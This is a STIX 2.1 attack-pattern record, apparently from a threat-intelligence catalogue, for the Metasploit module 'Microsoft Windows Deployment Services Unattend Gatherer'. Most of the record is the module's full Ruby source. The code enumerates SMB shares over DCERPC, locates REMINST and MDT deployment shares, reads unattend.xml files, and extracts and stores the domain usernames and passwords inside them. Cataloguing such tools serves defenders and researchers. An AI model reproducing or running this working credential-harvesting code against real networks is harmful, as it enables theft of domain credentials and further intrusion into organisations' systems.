{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e13346fd-f0f9-4f23-a23d-270f569cc72a",
    "created": "2024-08-14T16:31:31.351088Z",
    "modified": "2024-08-14T16:31:31.351092Z",
    "name": "Microsoft Windows Deployment Services Unattend Gatherer",
    "description": " This module will search remote file shares for unattended installation files that may contain domain credentials. This is often used after discovering domain credentials with the auxiliary/scanner/dcerpc/windows_deployment_services module or in cases where you already have domain credentials. This module will connect to the RemInst share and any Microsoft Deployment Toolkit shares indicated by the share name comments. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/windows_deployment_services_shares.rb",
            "external_id": "windows_deployment_services_shares.rb"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx"
        },
        {
            "source_name": "reference",
            "url": "http://rewtdance.blogspot.com/2012/11/windows-deployment-services-clear-text.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::DCERPC\n\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',\n      'Description'    => %q{\n          This module will search remote file shares for unattended installation files that may contain\n          domain credentials. This is often used after discovering domain credentials with the\n          auxiliary/scanner/dcerpc/windows_deployment_services module or in cases where you already\n          have domain credentials. This module will connect to the RemInst share and any Microsoft\n          Deployment Toolkit shares indicated by the share name comments.\n      },\n      'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],\n          [ 'URL', 'http://rewtdance.blogspot.com/2012/11/windows-deployment-services-clear-text.html'],\n        ],\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(445),\n        OptString.new('SMBDomain', [ false, \"SMB Domain\", '']),\n      ])\n\n  end\n\n  # Determine the type of share based on an ID type value\n  def share_type(val)\n    stypes = %W{ DISK PRINTER DEVICE IPC SPECIAL TEMPORARY }\n    stypes[val] || 'UNKNOWN'\n  end\n\n\n  # Stolen from enumshares - Tried refactoring into simple client, but the two methods need to go in EXPLOIT::SMB and EXPLOIT::DCERPC\n  # and then the lanman method calls the RPC method. Suggestions where to refactor to welcomed!\n  def srvsvc_netshareenum\n    shares = []\n    handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', [\"\\\\srvsvc\"])\n\n    begin\n      dcerpc_bind(handle)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      print_error(e.message)\n      return\n    end\n\n    stubdata =\n      NDR.uwstring(\"\\\\\\\\#{rhost}\") +\n      NDR.long(1)  #level\n\n    ref_id = stubdata[0,4].unpack(\"V\")[0]\n    ctr = [1, ref_id + 4 , 0, 0].pack(\"VVVV\")\n\n    stubdata << ctr\n    stubdata << NDR.align(ctr)\n    stubdata << [0xffffffff].pack(\"V\")\n    stubdata << [ref_id + 8, 0].pack(\"VV\")\n\n    response = dcerpc.call(0x0f, stubdata)\n\n    # Additional error handling and validation needs to occur before\n    # this code can be moved into a mixin\n\n    res = response.dup\n    win_error = res.slice!(-4, 4).unpack(\"V\")[0]\n    if win_error != 0\n      fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} Win_error = #{win_error.to_i}\")\n    end\n\n    # Level, CTR header, Reference ID of CTR\n    res.slice!(0,12)\n    share_count = res.slice!(0, 4).unpack(\"V\")[0]\n\n    # Reference ID of CTR1\n    res.slice!(0,4)\n    share_max_count = res.slice!(0, 4).unpack(\"V\")[0]\n\n    if share_max_count != share_count\n      fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} share_max_count did not match share_count\")\n    end\n\n    # ReferenceID / Type / ReferenceID of Comment\n    types = res.slice!(0, share_count * 12).scan(/.{12}/n).map{|a| a[4,2].unpack(\"v\")[0]}\n\n    share_count.times do |t|\n      length, offset, max_length = res.slice!(0, 12).unpack(\"VVV\")\n\n      if offset != 0\n        fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} share offset was not zero\")\n      end\n\n      if length != max_length\n        fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} share name max length was not length\")\n      end\n\n      name = res.slice!(0, 2 * length)\n      res.slice!(0,2) if length % 2 == 1 # pad\n\n      comment_length, comment_offset, comment_max_length = res.slice!(0, 12).unpack(\"VVV\")\n\n      if comment_offset != 0\n       fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} share comment offset was not zero\")\n      end\n\n      if comment_length != comment_max_length\n         fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} share comment max length was not length\")\n      end\n\n      comment = res.slice!(0, 2 * comment_length)\n      res.slice!(0,2) if comment_length % 2 == 1 # pad\n\n      shares << [ name, share_type(types[t]), comment]\n    end\n\n    shares\n  end\n\n  def run_host(ip)\n    deploy_shares = []\n\n    begin\n      connect(versions: [1])\n      smb_login\n      srvsvc_netshareenum.each do |share|\n        # Ghetto unicode to ascii conversation\n        share_name = share[0].unpack(\"v*\").pack(\"C*\").split(\"\\x00\").first\n        share_comm = share[2].unpack(\"v*\").pack(\"C*\").split(\"\\x00\").first\n        share_type = share[1]\n\n        if share_type == \"DISK\" && (share_name == \"REMINST\" || share_comm == \"MDT Deployment Share\")\n          vprint_good(\"Identified deployment share #{share_name} #{share_comm}\")\n          deploy_shares << share_name\n        end\n      end\n\n      deploy_shares.each do |deploy_share|\n        query_share(deploy_share)\n      end\n\n    rescue ::Interrupt\n      raise $!\n    end\n  end\n\n  def query_share(share)\n    share_path = \"\\\\\\\\#{rhost}\\\\#{share}\"\n    vprint_status(\"Enumerating #{share}...\")\n\n    begin\n      simple.connect(share_path)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      print_error(\"Could not access share: #{share} - #{e}\")\n      return\n    end\n\n    results = simple.client.file_search(\"\\\\\", /unattend.xml$/i, 10)\n\n    results.each do |file_path|\n      file = simple.open(file_path, 'o').read()\n      next unless file\n\n      loot_unattend(file)\n\n      creds = parse_client_unattend(file)\n      creds.each do |cred|\n        next unless (cred && cred['username'] && cred['password'])\n        next unless cred['username'].to_s.length > 0\n        next unless cred['password'].to_s.length > 0\n\n        report_creds(cred['domain'].to_s, cred['username'], cred['password'])\n        print_good(\"Credentials: \" +\n          \"Path=#{share_path}#{file_path} \" +\n          \"Username=#{cred['domain'].to_s}\\\\#{cred['username'].to_s} \" +\n          \"Password=#{cred['password'].to_s}\"\n        )\n      end\n    end\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def parse_client_unattend(data)\n\n    begin\n      xml = REXML::Document.new(data)\n    rescue REXML::ParseException => e\n      print_error(\"Invalid XML format\")\n      vprint_line(e.message)\n    end\n    Rex::Parser::Unattend.parse(xml).flatten\n  end\n\n  def loot_unattend(data)\n    return if data.empty?\n    path = store_loot('windows.unattend.raw', 'text/plain', rhost, data, \"Windows Deployment Services\")\n    print_good(\"Stored unattend.xml in #{path}\")\n  end\n\n  def report_creds(domain, user, pass)\n    report_cred(\n      ip: rhost,\n      port: 445,\n      service_name: 'smb',\n      user: \"#{domain}\\\\#{user}\",\n      password: pass,\n      proof: domain\n    )\n  end\nend\n"
}